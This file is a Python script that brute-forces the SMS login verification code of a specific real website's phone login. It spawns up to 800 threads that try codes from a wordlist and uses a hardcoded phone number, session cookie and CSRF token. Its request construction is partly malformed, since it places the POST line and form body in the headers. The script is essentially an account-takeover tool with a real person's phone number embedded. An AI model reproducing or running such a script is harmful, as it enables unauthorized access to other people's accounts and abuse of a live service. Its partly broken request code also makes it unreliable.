# -*- coding:utf-8 -*-

from urllib import request
from bs4 import BeautifulSoup
from threading import Thread
from time import sleep


def conn(f, host):
    for i in f:
        head = {}
        head['POST'] = '/login/phone HTTP/1.1'
        head['Host'] = 'anewme.cn'
        head['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'
        head['Content-Type'] = 'application/x-www-form-urlencoded'
        head['Accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        head[
            'Cookie'] = 'CNZZDATA1260082819=661439901-1504512085-%7C150648659; UM_distinctid=15e501131e71c1-04e150cf6e0d02-12656e4a-100200-15e501131e91ce; PHPSESSID=f7fsn2t85nb5pltanuc3kt0ulm'
        head['Referer'] = ' http://anewme.cn/login?goto=/'
        head['Connection'] = 'close'
        head['Upgrade-Insecure-Requests'] = 1
        head['Body'] = 'mobile=18811484144&code=%s&_csrf_token=vzTAIBb8uz5Ulrgx5Pk5Rp7kDP2PK7-GqG9cMhorCno' % i.strip(
            "\r\n")
        req = request.Request(host, headers=head)
        response = request.urlopen(req)
        page = response.read(609).decode('utf-8')
        soup = BeautifulSoup(page, 'html.parser')
        div = soup.find('title')
        print(i.strip("\r\n") + "is testing")
        if str(div) == '<title>提示信息</title>':
            print('xata')
        else:
            print("toghra"+str(i))
            break
host = 'http://www.anewme.cn/login/phone'
f = open('1_6/0.txt')
if __name__ == "__main__":
    for i in range(0, 800):
        t = Thread(target=conn, args=(f, host))
        sleep(0.25)
        t.start()
